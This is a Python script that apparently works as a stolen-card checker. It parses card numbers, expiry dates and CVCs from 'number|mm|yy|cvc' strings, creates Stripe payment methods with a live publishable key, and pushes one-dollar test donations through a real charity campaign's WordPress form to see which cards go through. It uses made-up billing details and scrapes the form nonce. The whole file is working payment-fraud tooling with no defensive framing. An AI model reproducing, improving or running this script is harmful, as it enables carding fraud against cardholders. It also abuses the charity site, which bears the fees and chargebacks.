import requests
from bs4 import BeautifulSoup

session = requests.Session()

# Global headers
stripe_headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10)',
}
donation_headers = {
    'authority': 'needhelped.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://needhelped.com',
    'referer': 'https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64)',
    'x-requested-with': 'XMLHttpRequest',
}

# Fetch nonce once
def get_nonce():
    res = session.get("https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/")
    soup = BeautifulSoup(res.text, "html.parser")
    try:
        return soup.find('input', {'name': '_charitable_donation_nonce'}).get('value')
    except:
        return None

nonce = get_nonce()

def Tele(ccx):
    try:
        n, mm, yy, cvc = ccx.strip().split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        # 1. Create payment method
        stripe_data = f"type=card&billing_details[name]=Arhan+verma&billing_details[email]=Arhan911man%40gmail.com&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=Main+Street&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[phone]=2747548742&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr"

        res1 = session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data)
        pm_id = res1.json().get("id")
        if not pm_id:
            return ["❌ Stripe Error", res1.text]

        # 2. Submit donation
        donation_data = {
            'charitable_form_id': '675e79411a82a',
            '675e79411a82a': '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
            'campaign_id': '1164',
            'description': 'Donation',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Arhan',
            'last_name': 'verma',
            'email': 'arhan911man@gmail.com',
            'address': '116 Jennifer Haven Apt. 225',
            'address_2': '',
            'city': 'New York',
            'state': 'NY',
            'postcode': '10080',
            'country': 'US',
            'phone': '2747548742',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        res2 = session.post("https://needhelped.com/wp-admin/admin-ajax.php", headers=donation_headers, data=donation_data)
        try:
            json_data = res2.json()
            if 'errors' in json_data:
                return json_data['errors']
            else:
                return "succeeded"
        except:
            return ["❌ Unknown Response", res2.text]
    except Exception as e:
        return [f"❌ Error: {str(e)}"]